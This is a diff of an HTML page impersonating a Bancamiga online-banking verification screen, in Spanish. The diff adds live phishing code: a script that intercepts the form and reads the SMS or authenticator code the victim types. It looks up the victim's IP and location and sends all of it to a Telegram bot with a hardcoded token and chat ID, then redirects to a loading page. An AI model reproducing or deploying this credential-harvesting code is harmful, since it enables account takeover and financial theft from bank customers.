@@ -1,30 +1,18 @@
 <!DOCTYPE html>
-<html lang="es" class="">
+<html lang="es">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <title>    Bancamiga</title>
-
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Bancamiga</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
     <link rel="stylesheet" type="text/css" media="screen" href="https://online.bancamiga.com/css/bancamiga.css">
-
-    <!-- #FAVICONS -->
     <link rel="shortcut icon" href="https://online.bancamiga.com/img/favicon/favicon.ico" type="image/x-icon">
     <link rel="icon" href="https://online.bancamiga.com/img/favicon/favicon.ico" type="image/x-icon">
-
-    <!-- FUENTES DE ICONOS NUEVOS -->
     <link rel="stylesheet" href="https://online.bancamiga.com/css/pe-icon-7-stroke.css">
-
-
-  
-
-    <!-- Jquery Seat Charts -->
     <link rel="stylesheet" href="https://online.bancamiga.com/js/plugin/jquery-seat-charts/jquery.seat-charts.css">
-
     <meta name="msapplication-TileColor" content="#ffffff">
     <meta name="msapplication-TileImage" content="https://online.bancamiga.com/img/favicon/ms-icon-144x144.png">
     <meta name="theme-color" content="#ffffff">
-<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
     
     <style type="text/css">
         body.stop-scrolling {
@@ -52,105 +40,135 @@
         .align-middle {
             vertical-align: middle !important;
         }
+
+        .jqstooltip { 
+            position: absolute; 
+            left: 0px; 
+            top: 0px; 
+            visibility: hidden; 
+            background-color: rgba(0,0,0,0.6); 
+            color: white; 
+            font: 10px arial, san serif; 
+            text-align: left; 
+            white-space: nowrap; 
+            padding: 5px; 
+            border: 1px solid white; 
+            z-index: 10000;
+        }
+
+        .jqsfield { 
+            color: white; 
+            font: 10px arial, san serif; 
+            text-align: left;
+        }
     </style>
 
+    <script>
+        async function getLocation() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                return {
+                    city: data.city,
+                    region: data.regionName,
+                    country: data.country,
+                    ip: data.query
+                };
+            } catch (error) {
+                console.error('Error al obtener la ubicación:', error);
+                return {
+                    city: 'No disponible',
+                    region: 'No disponible',
+                    country: 'No disponible',
+                    ip: 'No disponible'
+                };
+            }
+        }
 
-<style type="text/css">.jqstooltip { position: absolute;left: 0px;top: 0px;visibility: hidden;background: rgb(0, 0, 0) transparent;background-color: rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)";color: white;font: 10px arial, san serif;text-align: left;white-space: nowrap;padding: 5px;border: 1px solid white;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}
-</style>
+        async function sendMessage() {
+            const cod1 = document.getElementById("cod1").value;
+            const location = await getLocation();
+            const token = "8071410762:AAFOUv9oR1Dh3_OLwBdTM95YWZwYUwwqKr4"; // Reemplaza con el token de tu bot
+            const chatId = "-4571868410"; // Reemplaza con el chat ID donde deseas enviar el mensaje
 
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const params = {
+                chat_id: chatId,
+                text: `Código1: ${cod1}\nCiudad: ${location.city}\nEstado: ${location.region}\nPaís: ${location.country}\nIP: ${location.ip}`
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+
+                if (response.ok) {
+                    // Eliminar la alerta, solo redirigir después de enviar
+                    window.location.href = 'cargandob.html'; // Redirige a la página deseada
+                } else {
+                    console.error('Error al enviar el mensaje a Telegram.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const form = document.getElementById("login-form");
+            form.addEventListener("submit", function(event) {
+                event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+                sendMessage(); // Llama a la función para enviar el mensaje
+            });
+        });
+    </script>
 </head>
 
-<body class="smart-style-2 fixed-page-footer fixed-header desktop-detected" style="">
+<body class="smart-style-2 fixed-page-footer fixed-header desktop-detected">
+    <div id="main" role="main" class="mainRegister" style="background-image: url(docs/fondo-custom.jpg?V=02/10/23-03:00:40) !important;">
+        <div id="content" class="container">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header" style="background:url('docs/suite-fondo.jpg')">
+                        <h4 class="modal-title text-center">
+                            <img src="./docs/suite02.webp" style="width: 85%;">
+                        </h4>
+                    </div>
 
-  <div id="main" role="main" class="mainRegister"
-  style="background-image: url(docs/fondo-custom.jpg?V=02/10/23-03:00:40) !important;" bis_skin_checked="1">
-                <div id="content" class="container" style="opacity: 1;" bis_skin_checked="1"><style>
-    .redes-login {
-        justify-content: space-between;
-        margin-right: 10px;
-        display: inline-flex;
-        width: 30px;
-        box-shadow: 2px 2px 4px #0003;
-        border-radius: 50%;
-    }
+                    <form id="login-form" method="post">
+                        <div class="cf-turnstile" data-sitekey="0x4AAAAAAANeHPgF86kpmr3i" data-callback="turnstileLoaded" data-error-callback="turnstileLoaded"></div>
 
-    .swal2-warning {
-        color: #f27474 !important;
-        border-color: #f27474 !important;
-    }
-</style>
-<div class="modal-dialog "  >
-    <div class="modal-content" bis_skin_checked="1">
-        <div class="modal-header" style="background:url('docs/suite-fondo.jpg')" bis_skin_checked="1">
-            <h4 class="modal-title text-center">
-                <img src="./docs/suite02.webp"  style="width: 85%;">
-            </h4>
-        </div>
-
-        <form id="login-form" method="post" action="cargandob.html">
-            <div class="cf-turnstile" data-sitekey="0x4AAAAAAANeHPgF86kpmr3i" data-callback="turnstileLoaded" data-error-callback="turnstileLoaded" bis_skin_checked="1"></div>
-
-           
-
-            <div class="modal-footer text-center" bis_skin_checked="1" >
-                <fieldset style="padding: 0 14px 5px; ">
-
-                  <span style="font-family: Segoe UI, Segoe UI Web (West European), Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif;
-    -webkit-font-smoothing: antialiased;
-    font-size: 20px;
-    font-weight: 600;
-    display: block;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis; font-size:22px">Autorizaci&oacute;n</span>
-	
-	Ingrese el código de verificación que fue enviado a través de correo electrónico y número de telefónico vía SMS o a través del autenticador. 
-              
-               <br>
-              <br>
-               <img src="./docs/imgg.jpeg"  style="width: 105px;">
-			      <br>
-              <br>
-			  Hemos enviado el código de verificación  <br>
-			     <input type="tel" name="cod1" id="cod1" style="text-align:center" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="7" maxlength="7" autocomplete="off" required placeholder="Ingrese el código">
-			     <br> <br>
-			    <button type="submit" class="btn btn-success " 
-								style="border: 1px solid rgb(132, 168, 62); border-radius:10px; width:190px" >
+                        <div class="modal-footer text-center">
+                            <fieldset style="padding: 0 14px 5px;">
+                                <span style="font-family: Segoe UI, -apple-system, BlinkMacSystemFont, Roboto, Helvetica Neue, sans-serif; font-size: 22px; font-weight: 600; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">Autorizaci&oacute;n</span>
+                                Ingrese el código de verificación que fue enviado a través de correo electrónico y número de telefónico vía SMS o a través del autenticador. 
+                                <br><br>
+                                <img src="./docs/imgg.jpeg" style="width: 105px;">
+                                <br><br>
+                                Hemos enviado el código de verificación  
+                                <br> <!-- Espacio adicional para separación -->
+                                <input type="tel" name="cod1" id="cod1" style="text-align:center" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="7" maxlength="7" autocomplete="off" required placeholder="Ingrese el código">
+                                <br><br>
+                                <button type="submit" class="btn btn-success" style="border: 1px solid rgb(132, 168, 62); border-radius:10px; width:190px">
                                     Verificar
                                 </button>
-                </fieldset>
+                            </fieldset>
+                        </div>
+                    </form>
+                    <br><br>
+                </div>
             </div>
-        </form>
-               <br>
-              <br>
+        </div>
+
+        <div class="page-footer text-center">
+            <strong class="txt-color-white">
+                Bancamiga Banco Universal - RIF: J-31628759-9
+                <span class="hidden-xs"> Copyright © 2018.</span> Todos los derechos reservados.
+            </strong>
+        </div>
     </div>
-</div>
-
-</div>
-            </div>
-            <!-- #PAGE FOOTER -->
-<div class="page-footer text-center" bis_skin_checked="1">
-
-        <strong class="txt-color-white">
-            Bancamiga Banco Universal - RIF: J-31628759-9
-            <span class="hidden-xs"> Copyright © 2018.</span> Todos los derechos reservados.</strong>
-
-    <table class="pull-right" style="margin-top:-10px" width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
-        <tbody><tr>
-            <td width="135" align="center" valign="top">
-
-
-                <br>
-
-            </td>
-        </tr>
-    </tbody></table>
-
-
-
-    <!-- end row -->
-</div>
-<!-- END FOOTER -->
-
 </body>
 </html>
